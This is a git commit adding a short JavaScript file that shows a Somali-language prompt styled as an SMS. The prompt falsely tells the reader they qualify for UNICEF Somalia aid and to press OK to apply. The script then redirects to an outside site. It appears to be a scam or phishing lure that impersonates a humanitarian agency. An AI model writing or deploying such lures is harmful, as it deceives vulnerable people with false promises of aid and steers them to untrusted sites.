092ba1658f07ffcb178c909c1dcede16068dfdb9
bigukpe <bigaka42@gmail.com>
2025-04-02 07:44:52 +0100

    Create somalia-active.js

---
+++ somalia-active.js
@@ -0,0 +1,5 @@
+var password = 'Codso Hadda'
+password=prompt('SMS: Hambalyo, waxaad u qalantaa Unicef ​​Somalia, Riix OK hadda soo gudbi codsiga ','Codso Hadda');
+if (password != 'Codso Hadda') {
+location.href='https://learnlivetech.org/unicef-somalia';
+}
